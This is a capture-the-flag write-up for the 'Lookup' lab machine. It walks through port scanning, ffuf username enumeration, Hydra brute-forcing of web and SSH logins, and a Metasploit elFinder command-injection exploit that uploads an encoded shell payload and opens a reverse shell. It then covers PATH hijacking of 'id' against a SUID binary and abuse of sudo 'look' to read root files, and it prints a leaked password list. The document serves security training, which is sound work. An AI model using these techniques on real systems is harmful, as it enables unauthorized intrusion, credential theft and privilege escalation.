## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Test your enumeration skills on this boot-to-root machine.
**Lookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.﻿

**Note:** It is recommended to use your own VM if you'll ever experience problems visualizing the site.
```

## IP-Address
```IP-Address
10.201.77.90
```

## RustScan
```bash
$ rustscan -a 10.201.77.90 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```

Navigate to http://10.201.77.90 and we get a login form then we use BurpSuite to Get the req. details and to brute-force we used ffuf this time
```bash
└─$ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-X POST -d "username=FUZZ&password=asdasdasd" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://lookup.thm/login.php \
-fr "Wrong username or password"


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=[password omitted]
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Wrong username or password
________________________________________________

admin                  
jose                    
```

By which we got user name admin & jose then we use Hydra to brute-force the password
#hydra_Web_crack
```bash
$ hydra -l jose -P /usr/share/wordlists/rockyou.txt \
lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again."

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-05 16:59:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again.
[STATUS] 753.00 tries/min, 753 tries in 00:01h, 14343646 to do in 317:29h, 16 active
[80][http-post-form] host: lookup.thm   login: jose   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-05 17:01:53
```

this password for jose 
```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again."

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-05 17:01:03
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again.
[STATUS] 613.77 tries/min, 624 tries in 00:01h, 14343775 to do in 389:30h, 16 active
[STATUS] 375.25 tries/min, 1132 tries in 00:03h, 14343274 to do in 637:04h, 9 active
[80][http-post-form] host: lookup.thm   login: admin   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-05 17:04:43
```

and also the discovered the same password for admin then we login using jose becuase using admin we cant login then jose redirect us too
http://files.lookup.thm
for which we need to add in to /etc/hosts 
then Navigate to browser and got so many files we got nothing u=just a user name `think`
after then we surf a little and got know about the web file browser extension and version and tools name then we search on `metasploit ` and got the options
```bash
msf6 > search elFinder 2.1.48

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection                                                                   
Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection                  
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.thm
RHOSTS => files.lookup.thm
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RPORT 80
RPORT => 80
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST 10.17.36.74
LHOST => 10.17.36.74
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LPORT 4444
LPORT => 4444
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
[*] Started reverse TCP handler on 10.17.36.74:4444 
[*] Uploading payload 'j6XoPgNriP.jpg;echo 6370202e2e2f66696c65732f6a36586f50674e7269502e6a70672a6563686f2a202e73536f726144782e706870 |xxd -r -p |sh& #.jpg' (1953 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.sSoraDx.php) ...
[*] Sending stage (40004 bytes) to 10.201.22.244
[+] Deleted .sSoraDx.php
[*] Meterpreter session 1 opened (10.17.36.74:4444 -> 10.201.22.244:48724) at 2025-08-05 19:45:06 -0400
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter > shell
Process 3955 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

Got the `Reverseshell` and look for more
and then we checked for SUID and got one interesting
```bash
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```
`/usr/sbin/pwm` which is owned by root and when running the file it shows 
```bash
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
/usr/sbin/pwm id
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```
which tell us we need to play with the ID so we change directory to tmp #UID_Manipulation
```bash
cd /tmp
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
```
we changed the path and ID and got the file
```password
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

with using this we got hydra command password
```bash
$ hydra -l think -P password.txt ssh://lookup.thm    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-05 20:06:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-05 20:07:00
```

and Got the User Shell
```bash
ssh think@lookup.thm
pass: [password omitted]
think@ip-10-201-22-244:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
think@ip-10-201-22-244:~$ whoami
think
think@ip-10-201-22-244:~$ ls
user.txt
think@ip-10-201-22-244:~$ cat user.txt
[flag/hash omitted]
```
## User_Flag
```flag
[flag/hash omitted]
```

## Lets Do Privilege Escalation
```bash
$ sudo -l
Matching Defaults entries for think on ip-10-201-22-244:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-201-22-244:
    (ALL) /usr/bin/look
```
After this we know that we can run #look command as sudo by which we can get root.txt
```bash
think@ip-10-201-22-244:/$ LFILE=/root/root.txt
think@ip-10-201-22-244:/$ sudo look '' "$LFILE"
[flag/hash omitted]
```

## Got the Root Flag
```Flag
[flag/hash omitted]
```